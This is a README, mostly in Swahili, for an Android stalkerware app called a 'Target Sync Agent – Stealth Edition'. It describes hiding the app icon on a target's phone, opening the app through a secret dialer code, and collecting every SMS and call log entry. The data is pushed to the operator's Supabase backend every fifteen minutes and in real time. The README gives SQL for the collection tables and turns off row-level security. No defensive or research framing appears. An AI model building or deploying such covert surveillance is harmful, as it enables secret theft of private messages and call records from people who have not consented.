# 🔴 TARGET SYNC AGENT – STEALTH EDITION 🔴

<div align="center">
  <img src="/file_00000000339c71fd897e55b6a45eb0b2.png" alt="MR-AUTHOR" width="220" style="border: 3px solid red; border-radius: 15px; box-shadow: 0 0 20px red;">
  <pre style="color: red; font-size: 14px; font-family: monospace; line-height: 1.2;">
  ███╗   ███╗██████╗     █████╗ ██╗   ██╗████████╗██╗  ██╗ ██████╗ ██████╗ 
  ████╗ ████║██╔══██╗   ██╔══██╗██║   ██║╚══██╔══╝██║  ██║██╔═══██╗██╔══██╗
  ██╔████╔██║██████╔╝   ███████║██║   ██║   ██║   ███████║██║   ██║██████╔╝
  ██║╚██╔╝██║██╔══██╗   ██╔══██║██║   ██║   ██║   ██╔══██║██║   ██║██╔══██╗
  ██║ ╚═╝ ██║██║  ██║   ██║  ██║╚██████╔╝   ██║   ██║  ██║╚██████╔╝██║  ██║
  ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
  </pre>
  <p style="color: #ff4444; font-weight: bold;">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</p>
  <p style="color: red; font-style: italic;">"Silence is the best weapon. Your data, my command." — MR-AUTHOR</p>
  <p style="color: red;">⚡ OWNER: <span style="background: black; padding: 2px 8px; border: 1px solid red;">MR-AUTHOR</span> ⚡</p>
</div>

---

## 🔥 KAZI YA PROGRAMU

Programu hii inafanya kazi kwenye simu ya **target** (inayolengwa) **bila icon** (stealth mode). Inakusanya:
- ✅ SMS zote (mtumaji, ujumbe, muda)
- ✅ Orodha za simu (namba, aina: incoming/outgoing/missed, muda)

Kisha data zote **zinapelekwa kwenye Supabase** yako. Wewe unaweza kuziona kwa kutumia **dashboard** uliyojenga (signup/login form).

---

## 🧠 MANTIKI YA UFANYAKAZI

| Kipengele | Maelezo |
|-----------|---------|
| **Stealth mode** | Programu haina icon kwenye drawer au desktop. Inazinduliwa kwa kupiga `*#12345#` kwenye dialer. |
| **Ruhusa** | Inaomba ruhusa za kusoma SMS na call logs mara ya kwanza. |
| **Synchronization** | Mara tu inapoanza, inasoma SMS na call logs zote na kuzituma Supabase. |
| **Auto-sync** | Kila baada ya dakika 15 (au unapobonyeza kitufe cha SYNC) inasawazisha data mpya. |
| **Offline handling** | Ikiwa hakuna mtandao, inasubiri hadi mtandao urudi kisha inasawazisha. |
| **Realtime events** | Inasikiliza ujio wa SMS au simu mpya na kusawazisha mara moja (kwa plugins zinazounga mkono). |

---

## 🗃️ SUPABASE SETUP (LAZIMA KABLA)

Kabla ya kujenga APK, hakikisha umeunda meza kwenye Supabase yako:

```sql
-- Jedwali la SMS
CREATE TABLE sms (
  id SERIAL PRIMARY KEY,
  sender TEXT,
  body TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Jedwali la Call Logs
CREATE TABLE call_logs (
  id SERIAL PRIMARY KEY,
  number TEXT,
  type TEXT CHECK (type IN ('incoming', 'outgoing', 'missed')),
  duration INT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Zima RLS (kwa urahisi wa majaribio)
ALTER TABLE sms DISABLE ROW LEVEL SECURITY;
ALTER TABLE call_logs DISABLE ROW LEVEL SECURITY;
